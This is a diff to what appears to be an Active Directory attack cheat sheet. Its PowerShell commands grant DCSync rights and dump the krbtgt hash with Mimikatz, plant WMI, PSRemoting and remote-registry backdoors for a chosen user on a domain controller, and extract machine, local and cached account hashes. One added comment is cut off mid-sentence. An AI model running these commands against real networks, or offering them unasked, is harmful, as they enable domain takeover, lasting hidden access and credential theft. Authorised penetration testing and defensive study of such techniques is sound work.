@@ -597,11 +597,36 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtect
 ```powershell
 # Check if user01 has these permissions
 Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+
 # If you are a domain admin, you can grant this permissions to any user
 Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose
-# Gets the hash of krbtgt
+
+# Gets the hash of krbtgt (it is the most static user and can be used for impersonating other
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+
+### ACL for WMI, PSRemoting and remote Registry
+
+ - **With Powershell:**
+```powershell
+# Check access as current user (should output information)
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+# Give access to Remote WMI (root\cimv2 namespace) for user01 on computer dcorp-dc by administrator
+Set-RemoteWmi -UserName user01 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Verbose
+# Remove access to WMI
+Set-RemoteWmi -UserName user01 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Remove -Verbose
+
+# Set access via PSRemoting 
+Set-RemotePSRemoting -UserName user01 -ComputerName dcorp-dc -Verbose
+
+# Set access to remote registry for user01 (needs DAMP)
+Add-RemoteRegBackdoor -Trustee user01 -ComputerName dcorp-dc -Verbose
+# Retrieve hashes (machine, local and domain):
+Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
+Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
+Get-RemoteCachedAccountHash -Computername dcorp-dc -Verbose
+```
+
 
 # Privilege Escalation
 
